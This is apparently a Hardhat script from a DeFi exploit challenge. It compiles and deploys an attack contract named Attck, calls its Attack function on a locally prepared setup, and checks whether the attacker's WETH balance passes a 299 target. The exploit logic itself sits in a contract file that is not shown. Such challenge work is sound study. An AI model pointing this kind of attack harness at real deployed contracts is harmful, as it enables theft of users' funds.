const fs = require("fs");
const path = require("path");
const solc = require("solc");
const { ethers } = require("hardhat");
const { main: setupInitialState } = require("./setupInitialState");

function compileAttck() {
  const filePath = path.join(__dirname, "..", "contracts", "attck.sol");
  const source = fs.readFileSync(filePath, "utf8");
  const input = {
    language: "Solidity",
    sources: {
      "attck.sol": { content: source },
    },
    settings: {
      optimizer: { enabled: true, runs: 200 },
      viaIR: true,
      outputSelection: {
        "*": {
          Attck: ["abi", "evm.bytecode.object"],
        },
      },
    },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  if (output.errors) {
    const errors = output.errors.filter((err) => err.severity === "error");
    if (errors.length > 0) {
      throw new Error(errors.map((err) => err.formattedMessage).join("\n"));
    }
  }
  return output.contracts["attck.sol"].Attck;
}

async function main() {
  await setupInitialState();

  const deployed = require("../deployed.json");
  const [attacker] = await ethers.getSigners();
  const weth = await ethers.getContractAt(
    "@openzeppelin/contracts/token/ERC20/IERC20.sol:IERC20",
    deployed.weth
  );

  const compiled = compileAttck();
  const factory = new ethers.ContractFactory(
    compiled.abi,
    `0x${compiled.evm.bytecode.object}`,
    attacker
  );
  const attck = await factory.deploy();
  await attck.deployed();

  console.log("Attck:", attck.address);
  console.log("WETH before:", ethers.utils.formatEther(await weth.balanceOf(attacker.address)));

  const tx = await attck.Attack({ gasLimit: 90_000_000 });
  await tx.wait();

  const finalWeth = await weth.balanceOf(attacker.address);
  console.log("WETH after:", ethers.utils.formatEther(finalWeth));
  console.log("Target 299 met:", finalWeth.gte(ethers.utils.parseEther("299")));
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
